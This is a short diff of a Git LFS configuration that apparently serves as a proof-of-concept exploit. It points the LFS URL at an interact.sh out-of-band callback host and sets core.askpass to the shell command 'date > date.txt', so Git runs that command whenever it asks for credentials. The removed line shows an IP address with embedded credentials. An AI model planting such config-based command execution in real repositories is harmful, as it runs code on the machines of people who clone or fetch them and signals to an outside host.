@@ -1,5 +1,5 @@
 [lfs]
-	url = http://m:m@159.65.113.57
+	url = https://cask6d12vtc0000a53s0gfc3ugwyyyyyb.interact.sh
 	storage = ../lfstorage
 [core]
 	askpass = date > date.txt
